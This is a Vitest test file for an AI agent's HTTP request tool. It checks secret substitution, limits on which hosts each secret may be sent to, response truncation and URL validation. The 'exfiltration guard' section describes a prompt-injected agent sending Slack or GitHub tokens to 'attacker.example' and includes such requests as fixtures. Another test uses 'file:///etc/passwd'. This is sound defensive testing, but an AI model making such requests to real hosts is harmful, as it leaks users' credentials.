import { vi } from 'vitest'

import type { HttpFetcher } from '@posthog/agent-shared'

import { makeCtx } from '../test-helpers'
import { httpRequestV1 } from './http-request.v1'

/** Fake fetch response builder. */
function fakeResponse(opts: {
    status?: number
    text?: string
    contentType?: string
    headers?: Record<string, string>
}): Response {
    const status = opts.status ?? 200
    const text = opts.text ?? ''
    const headerEntries: Array<[string, string]> = Object.entries(opts.headers ?? {})
    if (opts.contentType !== undefined) {
        headerEntries.push(['content-type', opts.contentType])
    }
    return {
        ok: status >= 200 && status < 300,
        status,
        text: async () => text,
        headers: {
            get: (k: string) => headerEntries.find(([h]) => h.toLowerCase() === k.toLowerCase())?.[1] ?? null,
            entries: () => headerEntries[Symbol.iterator](),
        },
    } as unknown as Response
}

/**
 * Build an HttpFetcher whose `fetch` records the call args and returns the
 * supplied response. Replaces the old `global.fetch = vi.fn(...)` pattern —
 * tests inject this via `makeCtx({ http })` so the tool reaches it through
 * `ctx.http.fetch` (matching the prod path).
 */
function captureFetch(response: Response): {
    http: HttpFetcher
    lastCall: { url?: string; init?: RequestInit }
} {
    const captured: { url?: string; init?: RequestInit } = {}
    const http: HttpFetcher = {
        fetch: async (input, init) => {
            captured.url = typeof input === 'string' ? input : input instanceof URL ? input.toString() : ''
            captured.init = init
            return response
        },
    }
    return { http, lastCall: captured }
}

describe('@posthog/http-request', () => {
    describe('basic dispatch', () => {
        it('defaults to GET when method is omitted', async () => {
            const { http, lastCall } = captureFetch(
                fakeResponse({ status: 200, text: 'ok', contentType: 'text/plain' })
            )
            const out = await httpRequestV1.run({ url: 'https://example.com/ping' }, makeCtx({ http }))
            expect(lastCall.init?.method).toBe('GET')
            expect(out.status).toBe(200)
            expect(out.body).toBe('ok')
        })

        it.each(['GET', 'POST', 'PUT', 'PATCH', 'DELETE'] as const)('forwards method %s to fetch', async (method) => {
            const { http, lastCall } = captureFetch(fakeResponse({ status: 204 }))
            await httpRequestV1.run({ url: 'https://example.com/x', method }, makeCtx({ http }))
            expect(lastCall.init?.method).toBe(method)
        })

        it('returns the status, body, content_type, and a small allowlisted header subset', async () => {
            const { http } = captureFetch(
                fakeResponse({
                    status: 201,
                    text: '{"ok":true}',
                    contentType: 'application/json',
                    headers: { 'content-length': '11', 'x-custom-leak': 'should-not-surface' },
                })
            )
            const out = await httpRequestV1.run({ url: 'https://example.com/api' }, makeCtx({ http }))
            expect(out.status).toBe(201)
            expect(out.body).toBe('{"ok":true}')
            expect(out.content_type).toBe('application/json')
            expect(out.headers).toEqual({ 'content-length': '11', 'content-type': 'application/json' })
            expect(out.headers).not.toHaveProperty('x-custom-leak')
        })
    })

    describe('body serialization', () => {
        it('passes a string body through verbatim and does NOT set Content-Type for the caller', async () => {
            const { http, lastCall } = captureFetch(fakeResponse({ status: 200 }))
            await httpRequestV1.run(
                {
                    url: 'https://example.com/x',
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'channel=C123&text=hi',
                },
                makeCtx({ http })
            )
            expect(lastCall.init?.body).toBe('channel=C123&text=hi')
            const headers = lastCall.init?.headers as Record<string, string>
            expect(headers['Content-Type']).toBe('application/x-www-form-urlencoded')
        })

        it('JSON-encodes an object body and stamps Content-Type when the caller did not set it', async () => {
            const { http, lastCall } = captureFetch(fakeResponse({ status: 200 }))
            await httpRequestV1.run(
                {
                    url: 'https://slack.com/api/chat.postMessage',
                    method: 'POST',
                    body: { channel: 'C123', text: 'hello' },
                },
                makeCtx({ http })
            )
            expect(lastCall.init?.body).toBe('{"channel":"C123","text":"hello"}')
            const headers = lastCall.init?.headers as Record<string, string>
            expect(headers['Content-Type']).toBe('application/json; charset=utf-8')
        })

        it('does NOT override a caller-supplied Content-Type on an object body', async () => {
            // Author wants to send JSON under a vendor-specific content-type;
            // the tool must not silently rewrite it. Case-insensitive match.
            const { http, lastCall } = captureFetch(fakeResponse({ status: 200 }))
            await httpRequestV1.run(
                {
                    url: 'https://example.com/x',
                    method: 'POST',
                    headers: { 'content-type': 'application/vnd.api+json' },
                    body: { foo: 'bar' },
                },
                makeCtx({ http })
            )
            const headers = lastCall.init?.headers as Record<string, string>
            expect(headers['content-type']).toBe('application/vnd.api+json')
            expect(headers).not.toHaveProperty('Content-Type')
        })

        it('omits the body entirely for GET requests when none was passed', async () => {
            const { http, lastCall } = captureFetch(fakeResponse({ status: 200 }))
            await httpRequestV1.run({ url: 'https://example.com/x' }, makeCtx({ http }))
            expect(lastCall.init?.body).toBeUndefined()
        })
    })

    describe('secret substitution', () => {
        it('substitutes ${NAME} placeholders in url, headers, and string body', async () => {
            const { http, lastCall } = captureFetch(fakeResponse({ status: 200 }))
            const ctx = makeCtx({
                http,
                secret: (name) => ({ TENANT: 'acme', SLACK_BOT_TOKEN: 'xoxb-real-token' })[name],
                // TENANT is used in the host; pin to the wildcard so the
                // substituted host (`acme.example.com`) matches. SLACK_BOT_TOKEN
                // rides through the same request, so it also needs to allow the
                // destination host.
                secretAllowedHosts: (name) =>
                    name === 'TENANT' || name === 'SLACK_BOT_TOKEN' ? ['*.example.com'] : undefined,
            })
            await httpRequestV1.run(
                {
                    url: 'https://${TENANT}.example.com/api',
                    method: 'POST',
                    headers: { Authorization: 'Bearer ${SLACK_BOT_TOKEN}' },
                    body: 'tenant=${TENANT}',
                },
                ctx
            )
            expect(lastCall.url).toBe('https://acme.example.com/api')
            const headers = lastCall.init?.headers as Record<string, string>
            expect(headers.Authorization).toBe('Bearer xoxb-real-token')
            expect(lastCall.init?.body).toBe('tenant=acme')
        })

        it('substitutes ${NAME} inside JSON-encoded object bodies', async () => {
            // Slack's legacy token-in-body form. Author shouldn't have to
            // worry about JSON-encoding the placeholder.
            const { http, lastCall } = captureFetch(fakeResponse({ status: 200 }))
            const ctx = makeCtx({
                http,
                secret: (name) => (name === 'SLACK_BOT_TOKEN' ? 'xoxb-abc' : undefined),
                secretAllowedHosts: (name) => (name === 'SLACK_BOT_TOKEN' ? ['slack.com'] : undefined),
            })
            await httpRequestV1.run(
                {
                    url: 'https://slack.com/api/auth.test',
                    method: 'POST',
                    body: { token: '${SLACK_BOT_TOKEN}' },
                },
                ctx
            )
            expect(lastCall.init?.body).toBe('{"token":"xoxb-abc"}')
        })

        it('throws secret_not_resolved when a referenced secret is missing', async () => {
            // Fail loudly rather than send a literal `${NAME}` upstream — the
            // remote would 401 with a confusing error that's hard to debug.
            const { http } = captureFetch(fakeResponse({ status: 200 }))
            await expect(
                httpRequestV1.run(
                    {
                        url: 'https://example.com/x',
                        method: 'POST',
                        headers: { Authorization: 'Bearer ${MISSING}' },
                    },
                    makeCtx({ http })
                )
            ).rejects.toThrow(/secret_not_resolved: MISSING/)
        })

        it('only substitutes UPPERCASE_SNAKE placeholders — leaves shell-style ${1} alone', async () => {
            // Defensive: the regex requires names that start with [A-Z] and use
            // only [A-Z0-9_]. Things like `${1}` or `${something}` are pass-through
            // so authors who put literal `${foo}` in a JSON path or shell snippet
            // don't see their data mangled.
            const { http, lastCall } = captureFetch(fakeResponse({ status: 200 }))
            await httpRequestV1.run(
                { url: 'https://example.com/x', body: 'shell=${1} mixed=${foo}' },
                makeCtx({ http })
            )
            expect(lastCall.init?.body).toBe('shell=${1} mixed=${foo}')
        })
    })

    describe('per-secret host binding (exfiltration guard)', () => {
        // The reviewer's threat: a prompt-injected agent steers the model into
        // calling http-request against an attacker URL with a real Slack/GH
        // bearer in the Authorization header. spec.secrets[].allowed_hosts pins
        // each secret to a fixed destination so the substitution refuses
        // before fetch — the credential never leaves the runner.

        it('refuses substitution when the URL host is not in the secret allowlist', async () => {
            const fetch = vi.fn(async () => fakeResponse({ status: 200 }))
            const http = { fetch } as unknown as HttpFetcher
            const ctx = makeCtx({
                http,
                secret: (name) => (name === 'SLACK_BOT_TOKEN' ? 'xoxb-real' : undefined),
                secretAllowedHosts: (name) => (name === 'SLACK_BOT_TOKEN' ? ['slack.com'] : undefined),
            })
            await expect(
                httpRequestV1.run(
                    {
                        url: 'https://attacker.example/x',
                        method: 'POST',
                        headers: { Authorization: 'Bearer ${SLACK_BOT_TOKEN}' },
                    },
                    ctx
                )
            ).rejects.toThrow(/secret_host_not_allowed: SLACK_BOT_TOKEN -> attacker\.example/)
            expect(fetch).not.toHaveBeenCalled()
        })

        it('refuses substitution for bare-string spec.secrets entries (no host binding)', async () => {
            // Hard-break for existing specs: bare-string secrets still RESOLVE
            // (encrypted_env lookup works) but http-request will not stamp
            // them onto a request. The author must convert to the object form
            // with allowed_hosts.
            const fetch = vi.fn(async () => fakeResponse({ status: 200 }))
            const http = { fetch } as unknown as HttpFetcher
            const ctx = makeCtx({
                http,
                secret: (name) => (name === 'LEGACY_TOKEN' ? 'live-value' : undefined),
                // Bare-string in spec.secrets → null binding.
                secretAllowedHosts: (name) => (name === 'LEGACY_TOKEN' ? null : undefined),
            })
            await expect(
                httpRequestV1.run(
                    {
                        url: 'https://api.github.com/user',
                        headers: { Authorization: 'Bearer ${LEGACY_TOKEN}' },
                    },
                    ctx
                )
            ).rejects.toThrow(/secret_no_host_binding: LEGACY_TOKEN/)
            expect(fetch).not.toHaveBeenCalled()
        })

        it('allows substitution when the URL host matches an exact entry', async () => {
            const { http, lastCall } = captureFetch(fakeResponse({ status: 200 }))
            const ctx = makeCtx({
                http,
                secret: (name) => (name === 'GH_PAT' ? 'ghp_real' : undefined),
                secretAllowedHosts: (name) => (name === 'GH_PAT' ? ['api.github.com'] : undefined),
            })
            await httpRequestV1.run(
                {
                    url: 'https://api.github.com/user',
                    headers: { Authorization: 'Bearer ${GH_PAT}' },
                },
                ctx
            )
            const headers = lastCall.init?.headers as Record<string, string>
            expect(headers.Authorization).toBe('Bearer ghp_real')
        })

        it('allows substitution when a wildcard entry matches the URL host suffix', async () => {
            const { http, lastCall } = captureFetch(fakeResponse({ status: 200 }))
            const ctx = makeCtx({
                http,
                secret: (name) => (name === 'TENANT_TOKEN' ? 'tk_real' : undefined),
                secretAllowedHosts: (name) => (name === 'TENANT_TOKEN' ? ['*.tenants.example'] : undefined),
            })
            await httpRequestV1.run(
                {
                    url: 'https://acme.tenants.example/api',
                    headers: { Authorization: 'Bearer ${TENANT_TOKEN}' },
                },
                ctx
            )
            const headers = lastCall.init?.headers as Record<string, string>
            expect(headers.Authorization).toBe('Bearer tk_real')
        })

        it('refuses when a wildcard entry would match the bare apex domain only', async () => {
            // `*.example.com` MUST NOT match bare `example.com` — that would
            // let an author accidentally widen the binding when they only
            // intended subdomains.
            const fetch = vi.fn(async () => fakeResponse({ status: 200 }))
            const http = { fetch } as unknown as HttpFetcher
            const ctx = makeCtx({
                http,
                secret: (name) => (name === 'TOKEN' ? 'tk' : undefined),
                secretAllowedHosts: (name) => (name === 'TOKEN' ? ['*.example.com'] : undefined),
            })
            await expect(
                httpRequestV1.run(
                    {
                        url: 'https://example.com/x',
                        headers: { Authorization: 'Bearer ${TOKEN}' },
                    },
                    ctx
                )
            ).rejects.toThrow(/secret_host_not_allowed: TOKEN -> example\.com/)
            expect(fetch).not.toHaveBeenCalled()
        })

        it('refuses a body-only secret reference when the URL host is not allowed', async () => {
            // The substitution path for body must respect the same host check
            // as headers — Slack's token-in-body form is still an exfil path.
            const fetch = vi.fn(async () => fakeResponse({ status: 200 }))
            const http = { fetch } as unknown as HttpFetcher
            const ctx = makeCtx({
                http,
                secret: (name) => (name === 'SLACK_BOT_TOKEN' ? 'xoxb-real' : undefined),
                secretAllowedHosts: (name) => (name === 'SLACK_BOT_TOKEN' ? ['slack.com'] : undefined),
            })
            await expect(
                httpRequestV1.run(
                    {
                        url: 'https://attacker.example/x',
                        method: 'POST',
                        body: { token: '${SLACK_BOT_TOKEN}' },
                    },
                    ctx
                )
            ).rejects.toThrow(/secret_host_not_allowed: SLACK_BOT_TOKEN -> attacker\.example/)
            expect(fetch).not.toHaveBeenCalled()
        })
    })

    describe('limits', () => {
        it('truncates response body to max_response_bytes', async () => {
            const big = 'x'.repeat(10_000)
            const { http } = captureFetch(fakeResponse({ status: 200, text: big }))
            const out = await httpRequestV1.run(
                { url: 'https://example.com/x', max_response_bytes: 100 },
                makeCtx({ http })
            )
            expect(out.body.length).toBe(100)
            expect(out.truncated).toBe(true)
        })

        it('marks truncated=false when the body fits under the cap', async () => {
            const { http } = captureFetch(fakeResponse({ status: 200, text: 'small' }))
            const out = await httpRequestV1.run({ url: 'https://example.com/x' }, makeCtx({ http }))
            expect(out.truncated).toBe(false)
        })

        it('streams the body and stops at the cap without reading the whole response', async () => {
            // Emit 1KB chunks and count pulls. With a 2500-byte cap the reader
            // should stop after ~3 chunks — proving max_response_bytes truncates
            // mid-stream rather than after the full body is materialized.
            let pulled = 0
            const oneKb = new Uint8Array(1000).fill(0x78) // 'x'
            const stream = new ReadableStream<Uint8Array>({
                pull(controller) {
                    pulled++
                    if (pulled > 100) {
                        controller.close()
                        return
                    }
                    controller.enqueue(oneKb)
                },
            })
            const res = {
                ok: true,
                status: 200,
                body: stream,
                // Must NOT be called — a streamed body should never be fully buffered.
                text: async () => {
                    throw new Error('text() should not be called when a body stream is present')
                },
                headers: { get: () => null, entries: () => [][Symbol.iterator]() },
            } as unknown as Response
            const http: HttpFetcher = { fetch: async () => res }

            const out = await httpRequestV1.run(
                { url: 'https://example.com/big', max_response_bytes: 2500 },
                makeCtx({ http })
            )

            expect(out.truncated).toBe(true)
            expect(out.body.length).toBe(2500)
            expect(pulled).toBeLessThan(10)
        })

        it('rejects invalid URLs with a clear error before calling fetch', async () => {
            // Different error class than http_request_failed so the model can
            // tell "I sent a malformed URL" apart from "the network blew up."
            const http: HttpFetcher = {
                fetch: vi.fn(async () => {
                    throw new Error('should not be called')
                }),
            }
            await expect(httpRequestV1.run({ url: 'not a url' }, makeCtx({ http }))).rejects.toThrow(/invalid_url/)
        })

        it('rejects non-http(s) schemes before fetching', async () => {
            const fetch = vi.fn(async () => {
                throw new Error('should not be called')
            })
            const http = { fetch } as unknown as HttpFetcher
            await expect(httpRequestV1.run({ url: 'file:///etc/passwd' }, makeCtx({ http }))).rejects.toThrow(
                /unsupported_url_scheme/
            )
            expect(fetch).not.toHaveBeenCalled()
        })

        it('surfaces fetch failures as http_request_failed', async () => {
            const http: HttpFetcher = {
                fetch: vi.fn(async () => {
                    throw new Error('ECONNREFUSED')
                }),
            }
            await expect(httpRequestV1.run({ url: 'https://example.com/x' }, makeCtx({ http }))).rejects.toThrow(
                /http_request_failed: ECONNREFUSED/
            )
        })

        it('surfaces AbortError as http_request_timeout', async () => {
            // The runtime aborts the fetch via AbortController on timeout; the
            // tool translates the resulting AbortError into a friendlier
            // message that includes the timeout value.
            const http: HttpFetcher = {
                fetch: vi.fn(async () => {
                    const e: Error & { name?: string } = new Error('aborted')
                    e.name = 'AbortError'
                    throw e
                }),
            }
            await expect(
                httpRequestV1.run({ url: 'https://example.com/x', timeout_ms: 50 }, makeCtx({ http }))
            ).rejects.toThrow(/http_request_timeout: 50ms/)
        })
    })
})
